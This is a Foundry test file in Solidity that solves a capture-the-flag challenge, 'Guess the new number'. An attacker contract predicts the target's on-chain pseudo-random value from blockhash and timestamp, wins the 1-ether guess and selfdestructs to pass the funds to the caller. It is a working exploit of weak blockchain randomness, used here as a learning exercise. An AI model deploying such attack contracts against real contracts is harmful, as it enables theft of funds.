// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/4-Guess-the-new-number.sol";

contract Nostradamus {
    function getRandomNumber() public view returns (uint8) {
        return uint8(
            uint256(
                keccak256(
                    abi.encodePacked(blockhash(block.number - 1), block.timestamp)
                )
            )
        );
    }

    function attack(GuessTheNewNumberChallenge t) external payable {
        t.guess{value: 1 ether}(getRandomNumber());
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract Challenge4Test is Test {
    GuessTheNewNumberChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheNewNumberChallenge{value: 1 ether}();
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testChallenge() public {
        
        vm.startPrank(address(player));

        Nostradamus exploit = new Nostradamus();
        vm.warp(1000);
        exploit.attack{value: 1 ether}(target);
        
        assertTrue(target.isComplete());
    }
}